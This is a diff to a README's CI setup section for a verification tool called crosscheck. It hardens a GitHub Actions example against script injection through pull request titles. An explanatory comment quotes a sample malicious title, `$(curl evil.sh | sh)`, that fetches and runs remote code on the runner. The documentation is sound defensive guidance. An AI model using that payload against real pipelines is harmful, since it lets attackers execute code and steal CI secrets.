@@ -25,15 +25,38 @@ jobs:
           node-version: '20'
 
       - run: npm install -g crosscheck
-      - run: crosscheck init
 
       - name: Verify changes
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
-        run: crosscheck verify --intent "PR ${{ github.event.pull_request.title }}"
+          # Passed through the environment, never interpolated into the shell.
+          # A pull request title is attacker-controlled text; writing
+          # ${{ github.event.pull_request.title }} inside `run:` substitutes it
+          # before bash parses the line, so a title like $(curl evil.sh | sh)
+          # executes on your runner with your secrets in scope.
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          crosscheck verify \
+            --base "origin/$BASE_REF" \
+            --intent "PR: $PR_TITLE"
 ```
 
-The workflow file is also included at `.github/workflows/crosscheck.yml`.
+Two things that are easy to get wrong:
+
+- **Don't run `crosscheck init` in CI.** It writes `.crosscheck/` into the working
+  tree, which then becomes the only uncommitted change there is to inspect.
+  Commit your config and policy instead, or let the defaults apply.
+- **Use `--base`.** A pull request checkout is clean, so there are no uncommitted
+  changes for a bare `crosscheck verify` to look at — it would review nothing.
+  `--base` makes the change under review the range `base..HEAD`, which is what
+  you actually want. `fetch-depth: 0` is required for the base branch's history
+  to be present.
+
+This repository's own `.github/workflows/crosscheck.yml` differs deliberately:
+it builds Crosscheck from the checkout rather than installing from npm, so a
+pull request is verified by the code in that pull request rather than by the
+last published release.
 
 ## Exit codes
 
